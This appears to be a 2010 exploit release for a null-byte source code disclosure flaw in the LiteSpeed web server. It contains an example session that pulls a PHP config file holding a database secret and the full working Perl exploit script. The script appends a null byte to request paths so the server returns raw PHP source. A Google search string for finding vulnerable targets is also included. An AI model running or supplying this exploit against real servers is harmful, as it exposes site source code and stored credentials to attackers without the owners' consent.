Litespeed Technologies Web Server Remote Poison null byte Zero-Day
discovered and exploited by Kingcope in June 2010
google gives me over 9million hits

Example exploit session:

%nc 192.168.2.19 80
HEAD / HTTP/1.0

HTTP/1.0 200 OK
Date: Sun, 13 Jun 2010 00:10:38 GMT
Server: LiteSpeed <-- consider it 0wned
Accept-Ranges: bytes
Connection: close
ETag: "6ff-4c12e288-a3ee"
Last-Modified: Sat, 12 Jun 2010 01:27:36 GMT
Content-Type: text/html
Content-Length: 1791

%fetch http://192.168.2.19/config.php
config.php 0 B 0 Bps
%cat config.php
%/usr/local/bin/perl Litespeed.pl 192.168.2.19 config.php
LiteSpeed Technologies Web Server Remote Source Code Disclosure Exploit
By Kingcope
June 2010

Saving source code of config.php into 192.168.2.19-config.php
Completed.
Operation Completed :>.
%cat 192.168.2.19-config.php
<?php
$db_secret="TOP SECRET PASSWORD";
?>
%

Exploit:

#!/usr/bin/perl
#
#LiteSpeed Technologies Web Server Remote Source Code Disclosure zero-day Exploit
#By Kingcope
#Google search: ""Proudly Served by LiteSpeed Web Server""
#June 2010
#Thanks to TheDefaced for the idea, http://www.milw0rm.com/exploits/4556
#

use IO::Socket;
use strict;

sub getphpsrc {
my $host = shift;
my $file = shift;

if (substr($file, 0, 1) eq "/") {
$file = substr($file, 1);
}
my $file2 = $file;
$file2 =~ s/\//_/g;
print "Saving source code of $file into $host-$file2\n";

my $sock = IO::Socket::INET->new(PeerAddr => $host,
PeerPort => '80',
Proto => 'tcp') || die("Could not connect
to $ARGV[0]");

print $sock "GET /$file\x00.txt HTTP/1.1\r\nHost: $ARGV[0]\r\nConnection:
close\r\n\r\n";

my $buf = "";

my $lpfound = 0;
my $saveme = 0;
my $savveme = 0;
while(<$sock>) {
if ($_ =~ /LiteSpeed/) {
$lpfound = 1;
}

if ($saveme == 2) {
$savveme = 1;
}

if ($saveme != 0 && $savveme == 0) {
$saveme++;
}

if ($_ =~ /Content-Length:/) {
$saveme = 1;
}

if ($savveme == 1) {
$buf .= $_;
}
}

if ($lpfound == 0) {
print "This does not seem to be a LiteSpeed Webserver, saving file anyways.\n";
}

open FILE, ">$host-$file2";
print FILE $buf;
close FILE;
print "Completed.\n";
}

print "LiteSpeed Technologies Web Server Remote Source Code Disclosure Exploit\n";
print "By Kingcope\n";
print "June 2010\n\n";

if ($#ARGV != 1) {
print "Usage: perl litespeed.pl <domain/ip> <php file>\n";
print "Example: perl litespeed.pl www.thedomain.com index.php\n";
exit(0);
}

getphpsrc($ARGV[0], $ARGV[1]);

print "Operation Completed :>.\n";